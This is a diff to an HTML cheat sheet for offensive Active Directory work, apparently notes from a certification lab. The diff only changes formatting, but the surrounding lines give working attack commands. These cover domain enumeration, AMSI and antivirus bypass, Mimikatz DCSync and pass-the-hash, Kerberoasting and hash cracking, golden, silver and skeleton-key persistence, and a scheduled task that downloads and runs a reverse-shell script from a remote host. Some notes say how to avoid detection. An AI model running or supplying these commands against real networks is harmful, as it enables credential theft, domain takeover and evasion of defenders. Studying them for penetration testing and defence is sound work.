@@ -31,18 +31,17 @@
 <pre>
 <div class="column" style="display: inline-block; text-align: left; background-color:gray;">
 <button onclick="document.location='/machete/offensive/penetration_testing/AD_attacks.html'" class="round" style="float: left;">&lt;&lt;</button><br><br>
-
 <h4>POWERSHELL ENUMERATION</h4>
 <details>
 <summary>DOMAIN ENUMERATION</summary>
-
 <b>ACTIVE DIRECTORY POWERSHELL MODULE</b> | <a href="https://github.com/samratashok/ADModule">ADModule</a> 
 
 <b>BLOODHOUND</b> | <a href="https://github.com/BloodHoundAD/BloodHound">BloodHound</a> 
 
 >> avoid detections like ATA (using sharphound collector to create the .zip file with the relationships associated)
 
-<b>C1: PS> </b><mark id="CRTP01">Invoke-BloodHound -CollectionMethod All -ExcludeDC</mark><br>
+<b>C1: PS> </b><mark id="CRTP01">Invoke-BloodHound -CollectionMethod All -ExcludeDC</mark>
+	
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#CRTP01')">.C1.</button> 
 	
 <b>POWERVIEW</b> | <a href="https://github.com/ZeroDayLab/PowerSploit/blob/master/Recon/PowerView.ps1">PowerView</a>
@@ -52,21 +51,21 @@
 <b><u>:::GET CURRENT DOMAIN</u></b>
 
 <b>C1: PS> </b><mark id="CRTP02">Get-Domain</mark> | (powerview)
-<b>C2: PS> </b><mark id="CRTP03">Get-ADDomain</mark> | (active directory module)<br>
+<b>C2: PS> </b><mark id="CRTP03">Get-ADDomain</mark> | (active directory module)
 
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#CRTP02')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#CRTP03')">.C2.</button> 
 
 <b><u>:::GET OBJECT OF ANOTHER DOMAIN</u></b>
 
 <b>C1: PS> </b><mark id="CRTP04">Get-Domain -Domain <domain></mark>
-<b>C2: PS> </b><mark id="CRTP05">Get-ADDomain -Identity <domain></mark><br>
+<b>C2: PS> </b><mark id="CRTP05">Get-ADDomain -Identity <domain></mark>
 
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#CRTP04')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#CRTP05')">.C2.</button> 
 
 <b><u>:::GET DOMAIN SID FOR THE CURRENT DOMAIN</u></b>
 
 <b>C1: PS> </b><mark id="CRTP06">Get-DomainSID</mark>
-<b>C2: PS> </b><mark id="CRTP07">(Get-ADDomain).DomainSID</mark><br>
+<b>C2: PS> </b><mark id="CRTP07">(Get-ADDomain).DomainSID</mark>
 
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#CRTP06')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#CRTP07')">.C2.</button> 
 
@@ -74,34 +73,33 @@
 
 <b>C1: PS> </b><mark id="CRTP08">Get-DomainPolicyData</mark>
 <b>C2: PS> </b><mark id="CRTP09">Get-DomainPolicy</mark>
-<b>C3: PS> </b><mark id="CRTP10">(Get-DomainPolicyData).systemaccess</mark><br>
+<b>C3: PS> </b><mark id="CRTP10">(Get-DomainPolicyData).systemaccess</mark>
 
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#CRTP08')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#CRTP09')">.C2.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#CRTP10')">.C3.</button> 
 
 <b><u>:::GET DOMAIN POLICY FOR ANOTHER DOMAIN</u></b>
 
-<b>C1: PS> </b><mark id="CRTP11">(Get-DomainPolicyData –domain [domain]).systemaccess</mark><br>
+<b>C1: PS> </b><mark id="CRTP11">(Get-DomainPolicyData –domain [domain]).systemaccess</mark>
 
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#CRTP11')">.C1.</button>
 
 <b><u>:::GET DOMAIN CONTROLLER FOR THE CURRENT DOMAIN</u></b>
 
 <b>C1: PS> </b><mark id="CRTP12">Get-DomainController</mark>
-<b>C2: PS> </b><mark id="CRTP13">Get-ADDomainController</mark><br>
+<b>C2: PS> </b><mark id="CRTP13">Get-ADDomainController</mark>
 
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#CRTP12')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#CRTP13')">.C2.</button> 
 
 <b><u>:::GET DOMAIN CONTROLLER FOR ANOTHER DOMAIN</u></b>
 
 <b>C1: PS> </b><mark id="CRTP14">Get-DomainController -Domain [domainName]</mark>
-<b>C2: PS> </b><mark id="CRTP15">Get-ADDomainController -DomainName [domainName] -Discover</mark><br>
+<b>C2: PS> </b><mark id="CRTP15">Get-ADDomainController -DomainName [domainName] -Discover</mark>
 
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#CRTP14')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#CRTP15')">.C2.</button> 	
 
 </details>		
 <details>
 <summary>PS BYPASS EXECUTION & AV SIGNATURES</summary>
-
 <b>EXECUTION</b>
 
 PS> powershell -ExecutionPolicy bypass [script.ps1]
@@ -124,8 +122,8 @@ RunWithRegistryNonAdmin.bat
 <b>:::BYPASS AV SIGNATURES <AMSITrigger></b>
 
 - load script in memory to avoid AMSI bypass
-AMSI Trigger to identify the part of the script that is detected !! Repeat the process until it is not detected to avoid detection on execution phase.
-<a href="https://github.com/RythmStick/AMSITrigger">AMSITrigger</a> 
+AMSI Trigger to identify the part of the script that is detected !! Repeat the process until it is not detected to avoid detection 
+on execution phase. | <a href="https://github.com/RythmStick/AMSITrigger">AMSITrigger</a> 
 
 quick usage:
 
@@ -179,7 +177,7 @@ S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{
 </details>
 <details>
 <summary>DOMAIN ACL ENUMERATION</summary>
-<p>DESCRIPTION: </p>
+<b>DESCRIPTION:</b>
 <b> -ACL- </b>
 
 <b>::: ENUMERATE ACL FOR DOMAIN ADMIN GROUP</b>
@@ -220,7 +218,7 @@ note: ?{$_. = means find everything
 </details>
 <details>
 <summary>DOMAIN COMPUTER ENUMERATION</summary>
-<p>DESCRIPTION: </p>
+<b>DESCRIPTION:</b>
 <h3>DOMAIN COMPUTER ENUMERATION WITH POWERSHELL</h3>
 
 <b>:::GET A LIST OF COMPUTERS IN THE CURRENT DOMAIN</b>
@@ -233,10 +231,11 @@ PS> Get-ADComputer -Filter * | select Name
 PS> Get-ADComputer -Filter * -Properties *
 PS> Get-ADComputer -Filter 'OperatingSystem -like "*Server 2016*"' -Properties OperatingSystem | select Name,OperatingSystem
 PS> Get-ADComputer -Filter * -Properties DNSHostname | %{Test-Connection -Count 1 -ComputerName $_.DNSHostName}
+
 </details>
 <details>
 <summary>DOMAIN FOREST ENUMERATION</summary>
-<p>DESCRIPTION: </p>
+<b>DESCRIPTION:</b>
 <h3> DOMAIN FOREST ENUMERATION WITH POWERSHELL</h3>
 
 <b> -FOREST- </b>
@@ -269,10 +268,11 @@ PS> Get-ForestTrust
 PS> Get-ForestTrust -Forest [domain]
 
 PS> Get-ADTrust -Filter 'msDS-TrustForestTrustInfo -ne "$null"'
+
 </details>
 <details>
 <summary>DOMAIN GPO ENUMERATION</summary>
-<p>DESCRIPTION: </p>
+<b>DESCRIPTION:</b>
 <h3> DOMAIN GPO ENUMERATION WITH POWERSHELL</h3>
 
 <b> -GPO- </b>
@@ -305,10 +305,11 @@ PS> Get-DomainGPO -Identity {00000000-0000-0000-0000-000000000000}
 <b>::: GET GPLINK ATTRIBUTE OF A GPO</b>
 
 PS> (Get-DomainOU -Identity [OU]).gplink
+
 </details>
 <details>
 <summary>DOMAIN TRUST ENUMERATION</summary>
-<p>DESCRIPTION: </p>
+<b>DESCRIPTION:</b>
 <h3> DOMAIN TRUST ENUMERATION WITH POWERSHELL</h3>
 
 <b> -TRUSTS- </b>
@@ -373,10 +374,11 @@ PS> Get-ADTrust -Filter *
 <b>::: MAP TRUSTS OF EXTERNAL TRUST</b>
 
 PS> Get-ADTrust -Filter * -Server [xternalTrust]  
+
 </details>
 <details>
 <summary>DOMAIN USER ENUMERATION</summary>
-<p>DESCRIPTION: </p>
+<b>DESCRIPTION:</b>
 <h3>DOMAIN ENUMERATION WITH POWERSHELL</h3>
 
 <b>:::GET LIST OF USER IN CURRENT DOMAIN</b>
@@ -424,10 +426,11 @@ PS> Get-LastLoggedOn -ComputerName [hostname]
 <b>::: GET USERS INFO TO CATCH DECOY USERS</b>
 
 PS> Get-DomainUser | select samaccountname,logoncount  
+
 </details>
 <details>
 <summary>DOMAIN ENUMERATION USERHUNTING</summary>
-<p>DESCRIPTION: </p>
+<b>DESCRIPTION:</b>
 <h3> DOMAIN ENUMERATION - USER HUNTING </h3>
 
 <b>::: FIND ALL MACHINES ON THE CURRENT DOMAIN WHERE THE CURRENT USER HAS LOCAL ADMIN ACCESS</b>
@@ -458,10 +461,11 @@ PS> Find-DomainUserLocation -CheckAccess
 <b>::: FIND COMPUTERS (FILE SERVERS AND DISTRIBUTED FILE SERVERS) WHERE A DOMAIN ADMIN SESSION IS AVAILABLE</b>
 
 PS> Find-DomainUserLocation -Stealth  
+
 </details>
 <details>
 <summary>DOMAIN GROUP MEMBERS ENUMERATION</summary>
-<p>DESCRIPTION: </p>
+<b>DESCRIPTION:</b>
 <h3>DOMAIN GROUP/MEMBERS ENUMERATION WITH POWERSHELL</h3>
 
 <b>:::GET ALL GROUPS IN THE CURRENT DOMAIN</b>
@@ -522,11 +526,10 @@ PS> (Get-DomainPolicy).KerberosPolicy
 
 PS> Get-DomainGroup *admin* -domain <forest/root> | select samaccountname
 </details>
-
 <h4>POWERSHELL LATERAL MOVEMENT</h4>
 <details>
 <summary>DOMAIN LATERAL MOVEMENT</summary>
-<p>DESCRIPTION: </p>
+<b></b>DESCRIPTION:
 <h3>LATERAL MOVEMENTS</h3>
 
 :: powershell remoting (PSRemoting)
@@ -546,10 +549,11 @@ PS> Enter-PSSession
 non-interactive | fan-out remoting
 
 PS> Invoke-Command  
+
 </details>
 <details>
 <summary>DOMAIN LATERAL MOVEMENT MIMIKATZ</summary>
-<p>DESCRIPTION: </p>
+<b>DESCRIPTION:</b>
 <h3>LATERAL MOVEMENT - MIMIKATZ</h3>
 
 >> invoke-mimikatz
@@ -613,10 +617,11 @@ NOTE: Domain Admins privileges are required to run DCSync
 PS> Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'
 
 PS> SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"  
+
 </details>
 <details>
 <summary>DOMAIN LATERAL MOVEMENT PSREMOTING</summary>
-<p>DESCRIPTION: </p>
+<b>DESCRIPTION:</b>
 <h3>LATERAL MOVEMENT - PS REMOTING</h3>
 
 --POWERSHELL REMOTING--
@@ -656,7 +661,7 @@ PS> winrs -remote:server1 -u:server1\administrator -p:Pass@1234 hostname
 	
 <details>
 <summary>DOMAIN LOCAL PRIVESC</summary>
-<p>DESCRIPTION: </p>
+<b>DESCRIPTION:</b>
 <h3>DOMAIN PRIVILEGE ESCALATION</h3>
 
 <a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc">PowerUp</a>
@@ -696,13 +701,14 @@ PS> import module and invoke "Find-PSRemotingLocalAdminAccess"
 PS> sc.exe sdshow {service_name}
 PS> sc.exe sdshow snmptrap
 
-NOTE: when cheking results. if exist a fifth parenthesis and at the end of that exist something similar 
+<b>NOTE:</b> when cheking results. if exist a fifth parenthesis and at the end of that exist something similar 
 to the following: {;;;WD)} it means "everyone". All the letters that compose every parenthesis means the
 different permissons assigned.  
+
 </details>
 <details>
 <summary>DOMAIN PRIVESC KERBEROAST</summary>
-<p>DESCRIPTION: </p>
+<b>DESCRIPTION:</b>
 <h3> PRIVESC - KERBEROAST </h3>
 
 <b>::: FIND USER ACCOUNTS USED AS "SERVICE ACCOUNTS"</b>
@@ -723,7 +729,7 @@ PS> Rubeus.exe kerberoast /stats
 
 PS> Rubeus.exe kerberoast /user:svcadmin /simple 
 
-NOTE: To avoid detections based on Encryption Downgrade for Kerberos EType(used by likes of ATA -0x17 stands for rc4-hmac), 
+<b>NOTE:</b> To avoid detections based on Encryption Downgrade for Kerberos EType(used by likes of ATA -0x17 stands for rc4-hmac), 
 look for Kerberoastableaccounts that only support RC4_HMAC
 
 PS> Rubeus.exe kerberoast /stats /rc4opsec
@@ -737,10 +743,11 @@ PS> Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt
 <b>::: CRACK TICKET USING JOHN THE RIPPER</b>
 
 PS> john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt  
+
 </details>
 <details>
 <summary>DOMAIN PRIVESC KERBEROAST ASREPs</summary>
-<p>DESCRIPTION: </p>
+<b>DESCRIPTION:</b>
 <h3> PRIVESC - KERBEROAST AS-REPs </h3>
 
 If a user's UserAccountControl settings have "Do not require Kerberos preauthentication" enabled i.e. 
@@ -781,10 +788,11 @@ PS> Invoke-ASREPRoast -Verbose
 We can use John The Ripper to brute-force the hashes offline
 
 PS> john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\asrephashes.txt  
+
 </details>
 <details>
 <summary>DOMAIN PRIVESC KERBEROAST SetPN</summary>
-<p>DESCRIPTION: </p>
+<b>DESCRIPTION:</b>
 <h3> PRIVESC - KERBEROAST | Set-SPN </h3>
 
 - With enough rights (GenericAll/GenericWrite), a target user's SPN can be set to anything (unique in the domain).
@@ -814,10 +822,11 @@ PS> Set-ADUser -Identity support1user -ServicePrincipalNames@{Add='ops/whatever1
 
 PS> Rubeus.exe kerberoast /outfile:targetedhashes.txt 
 PS> john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\targetedhashes.txt  
+
 </details>
 <details>
 <summary>DOMAIN PRIVESC KERBEROS DELEGATION</summary>
-<p>DESCRIPTION: </p>
+<b>DESCRIPTION:</b>
 <h3> PRIVESC - KERBEROS DELEGATION </h3>
 
 allows to "reuse the end-user credentials to access resources hosted on a different server"
@@ -893,10 +902,11 @@ need credentials when used against a DC"
 CONSTRAINED DELEGATION: which allows the first hop server (web server in our example) to request access only to 
 specified services on specified computers. If the user is not using Kerberos authentication to authenticate to the first 
 hop server, Windows offers Protocol Transition to transition the request to Kerberos  
+
 </details>	
 <details>
 <summary>DOMAIN OFFENSIVE.NET AV BYPASS</summary>
-<p>DESCRIPTION: </p>
+<b>DESCRIPTION:</b>
 <h3> OFFENSIVE .NET - AV BYPASS: STRING MANIPULATION</h3>
 
 <a href="https://github.com/matterpreter/DefenderCheck">DEFENDER CHECK</a> can be used to detect code and 
@@ -937,10 +947,11 @@ PS> C:\Users\Public\Loader.exe -path http://192.168.100.X/SafetyKatz.exe
 <b>::: USE ASSEMBLYLOAD.EXE THAT CAN BE USED TO LOAD NETLOADER IN MEMORY FROM URL WHICH THEN LOADS A BINARY FROM FILEPATH OR URL</b>
 
 PS> C:\Users\Public\AssemblyLoad.exe http://192.168.100.X/Loader.exe -path http://192.168.100.X/SafetyKatz.exe   
+
 </details>
 <details>
 <summary>DOMAIN OU ENUMERATION</summary>
-<p>DESCRIPTION: </p>
+<b>DESCRIPTION:</b>
 <h3> DOMAIN OU ENUMERATION WITH POWERSHELL </h3>
 
 <b>-OU-</b>
@@ -969,12 +980,11 @@ PS> (Get-DomainOU -Identity [OUName]).distinguishedname | %{Get-DomainComputer -
 
 % = means each result (object)  
 </details>
-
 <h4>POWERSHELL PERSISTENCE</h4>	
 	
 <details>
 <summary>DOMAIN PERSISTENCE ACL ADMINSDHOLDER</summary>
-<p>DESCRIPTION: </p>
+<b>DESCRIPTION:</b>
 <h3> PERSISTENCE - ACLs: AdminSDHolder </h3>
 
 Resides in the System container of a domain and used to control the permissions 
@@ -1049,10 +1059,11 @@ PS> Set-DomainUserPassword -Identity testda -AccountPassword(ConvertTo-SecureStr
 <b>::: USING AD MODULE</b>
 
 PS> Set-ADAccountPassword -Identity testda -NewPassword(ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose  
+
 </details>
 <details>
 <summary>DOMAIN PERSISTENCE ACL RIGHTS ABUSE</summary>
-<p>DESCRIPTION: </p>
+<b>DESCRIPTION:</b>
 <h3> PERSISTENCE - RIGHTS ABUSE </h3>
 
 With DA privileges, the ACL for the domain root can be modified to provide useful rights like FullControl or the ability to run "DCSync".
@@ -1082,10 +1093,11 @@ PS> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
 or
 
 PS> C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"  
+
 </details>
 <details>
 <summary>DOMAIN PERSISTENCE ACL SECURITY DESCRIPTORS</summary>
-<p>DESCRIPTION: </p>
+<b>DESCRIPTION: </b>
 <h3> PERSISTENCE - SECURITY DESCRIPTORS </h3>
 
 >> Security Descriptor Definition Language defines the format which is used to describe a security descriptor. 
@@ -1150,10 +1162,11 @@ PS> Get-RemoteLocalAccountHash -ComputerName dcorp-dc -Verbose
 <b> RETRIEVE DOMAIN CACHED CREDENTIALS</b>
 
 PS> Get-RemoteCachedCredential -ComputerName dcorp-dc -Verbose  
+
 </details>
 <details>
 <summary>DOMAIN PERSISTENCE CUSTOMSSP</summary>
-<p>DESCRIPTION: </p>
+<b>DESCRIPTION:</b>
 <h3> PERSISTENCE - CUSTOM SSP </h3>
 
 "is a DLL which provides ways for an application to obtain an authenticated connection"
@@ -1178,12 +1191,12 @@ PS> $packages Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name
 
 PS> Invoke-Mimikatz -Command '"misc::memssp"'
 
-NOTE: local logons are logged on the following file
-C:\Windows\system32\kiwissp.log  
+NOTE: local logons are logged on the following file <b>C:\Windows\system32\kiwissp.log</b>
+
 </details>
 <details>
 <summary>DOMAIN PERSISTENCE DSMR</summary>
-<p>DESCRIPTION: </p>
+<b>DESCRIPTION: </b>
 <h3> PERSISTENCE - DSMR </h3>
 
 "Directory Services Restore Mode"
@@ -1212,10 +1225,11 @@ PS> Enter-PSSession -Computername dcorp-dc New-ItemProperty "HKLM:\System\Curren
 PS> Invoke-Mimikatz -Command '"sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe"'
 
 PS> ls \\dcorp-dc\C$  
+
 </details>
 <details>
 <summary>DOMAIN PERSISTENCE GOLDEN</summary>
-<p>DESCRIPTION: </p>
+<b>DESCRIPTION: </b>
 <h3> PERSISTENCE - GOLDEN TICKET</h3>
 
 <b>::: GET KRBTGT HASH</b>
@@ -1237,10 +1251,11 @@ To use the DCSync feature for getting krbtgt hash execute the below command with
 (or a user that has replication rights on the domain object)
 
 PS> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'  
+
 </details>
 <details>
 <summary>DOMAIN PERSISTENCE SILVER</summary>
-<p>DESCRIPTION: </p>
+<b>DESCRIPTION:</b>
 <h3> PERSISTENCE - SILVER TICKET</h3>
 
 A valid TGS (Golden ticket is TGT).
@@ -1254,7 +1269,7 @@ Reasonable persistence period (default 30 days for computer accounts).
 PS> Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 
 /target:dcorp-dc.dollarcorp.moneycorp.local /service:CIFS /rc4:6f5b5acaf7433b3282ac22e21e62ff22 /user:Administrator /ptt"'
 
-NOTE: this same command can be applied for more services, (HTTP, HOST & more)
+<b>NOTE:</b> this same command can be applied for more services, (HTTP, HOST & more)
 
 <b>::: CREATE A SILVER TICKET FOR THE HOST SPN WHICH WILL ALLOW US TO SCHEDULE A TASK ON THE TARGET</b>
 
@@ -1267,10 +1282,11 @@ PS> schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT A
 "powershell.exe -c 'iex(New-Object Net.WebClient).DownloadString(''http://192.168.100.1:8080/Invoke-PowerShellTcp.ps1''')'"
 
 PS> schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN "STCheck"  
+
 </details>
 <details>
 <summary>DOMAIN PERSISTENCE SKELETON KEY</summary>
-<p>DESCRIPTION: </p>
+<b>DESCRIPTION:</b>
 <h3> PERSISTENCE - SKELETON-KEY </h3>
 
 Skeleton key is a persistence technique where it is possible to patch a Domain Controller (lsassprocess) 
@@ -1283,10 +1299,11 @@ PS> Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName
 Now, it is possible to access any machine with a valid username and password as "mimikatz"...
 
 PS> Enter-PSSession –Computername dcorp-dc –credential dcorp\Administrator  
+
 </details>
 <details>
 <summary>REMOTE CONNECTION</summary>
-<p>DESCRIPTION: </p>
+<b>DESCRIPTION:</b>
 <h3> REMOTE CONNECTION USING POWERSHELL </h3>
 
 <b>:::CONNECT TO A REMOTE MACHINE USING WINRS</b>
@@ -1297,6 +1314,7 @@ PS> winrs -r:CVS-SRV001 cmd
 <b>:::CONNECT TO A REMOTE MACHINE USING POWERSHELL-REMOTING</b>
 
 PS> Enter-PSSession -ComputerName [FQDN]  
+
 </details>
 </div>
 </pre>
